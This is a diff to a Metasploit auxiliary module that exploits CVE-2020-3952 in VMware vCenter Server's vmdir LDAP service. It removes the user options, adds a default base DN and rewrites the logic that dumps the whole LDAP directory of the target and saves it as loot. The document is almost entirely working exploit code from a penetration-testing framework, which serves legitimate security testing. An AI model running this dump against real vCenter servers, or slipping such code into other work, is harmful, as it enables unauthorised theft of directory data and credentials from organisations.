@@ -16,16 +16,6 @@ class MetasploitModule < Msf::Auxiliary
         vmdir service in VMware vCenter Server version 6.7 prior to the 6.7U3f
         update. Only installations upgraded from a previous release line, such
         as 6.0 or 6.5, are affected. Clean installations of 6.7 are unaffected.
-
-        If the BASE_DN option is set, it will be used as the LDAP base DN for
-        all requests. Since this option is unset by default, the base DN will be
-        discovered by searching the root DSE for the namingContexts attribute,
-        from which the base DN will be extracted.
-
-        If the PRINT_DATA option is set, LDAP data will be printed to the screen
-        as well as stored in loot. This option is unset by default because it
-        results in very noisy output. In either case, LDAP data is converted to
-        LDIF for readability before it is stored or printed.
       },
       'Author'         => [
         # Discovered by unknown researcher(s)
@@ -45,14 +35,13 @@ class MetasploitModule < Msf::Auxiliary
       }
     ))
 
-    register_options([
-      OptString.new('BASE_DN',  [false, 'LDAP base DN (discovered if unset)']),
-      OptBool.new('PRINT_DATA', [false, 'Print LDAP data to screen', false])
-    ])
-
     register_advanced_options([
       OptFloat.new('ConnectTimeout', [false, 'Timeout for LDAP connect', 10.0])
     ])
+  end
+
+  def base_dn
+    @base_dn || 'dc=vsphere,dc=local'
   end
 
 =begin PoC using ldapsearch(1)
@@ -69,62 +58,55 @@ class MetasploitModule < Msf::Auxiliary
       connect_timeout: datastore['ConnectTimeout']
     }
 
-    unless (ldap = Net::LDAP.new(opts))
-      print_error('Could not create Net::LDAP object with supplied options')
-      return
-    end
+    entries = nil
 
-    if datastore['BASE_DN']
-      @base_dn = datastore['BASE_DN']
-      print_status("Using base DN from BASE_DN option: #{@base_dn}")
-    else
+    Net::LDAP.open(opts) do |ldap|
       print_status('Discovering base DN automatically')
-      @base_dn = discover_base_dn(ldap)
-    end
 
-    unless @base_dn
-      print_error('Could not discover base DN; try setting the BASE_DN option?')
-      return
-    end
+      unless (@base_dn = discover_base_dn(ldap))
+        print_warning('Falling back on default base DN of dc=vsphere,dc=local')
+      end
 
-    print_status("Dumping LDAP data from vmdir service at #{peer}")
-    entries = ldap.search(base: @base_dn)
+      print_status("Dumping LDAP data from vmdir service at #{peer}")
+      entries = ldap.search(base: base_dn)
+    end
 
     if entries.nil? || entries.empty?
       print_error("#{peer} is NOT vulnerable to CVE-2020-3952")
-      return
+      return Exploit::CheckCode::Safe
     end
 
     print_good("#{peer} is vulnerable to CVE-2020-3952")
     pillage(entries)
+
+    # HACK: Stash discovered base DN in CheckCode reason
+    Exploit::CheckCode::Vulnerable(base_dn)
   rescue Net::LDAP::Error => e
     print_error("#{e.class}: #{e.message}")
-    return
+    Exploit::CheckCode::Unknown
   end
 
   def pillage(entries)
     # TODO: Make this more efficient?
     ldif = entries.map(&:to_ldif).join("\n")
 
-    print_status('Storing LDAP data in loot; use the "loot" command to see it!')
+    print_status('Storing LDAP data in loot')
 
     ldif_filename = store_loot(
-      self.name,             # ltype
-      'text/plain' ,         # ctype
-      rhost,                 # host
-      ldif,                  # data
-      nil,                   # filename
-      "Base DN: #{@base_dn}" # info
+      self.name,            # ltype
+      'text/plain' ,        # ctype
+      rhost,                # host
+      ldif,                 # data
+      nil,                  # filename
+      "Base DN: #{base_dn}" # info
     )
 
-    if ldif_filename
-      print_good("Saved LDAP data (#{ldif.length} bytes) to #{ldif_filename}")
+    unless ldif_filename
+      print_error('Could not store LDAP data in loot')
+      return
     end
 
-    if datastore['PRINT_DATA']
-      print_warning('Printing LDAP data to screen!')
-      print_line(ldif)
-    end
+    print_good("Saved LDAP data to #{ldif_filename}")
   end
 
 end
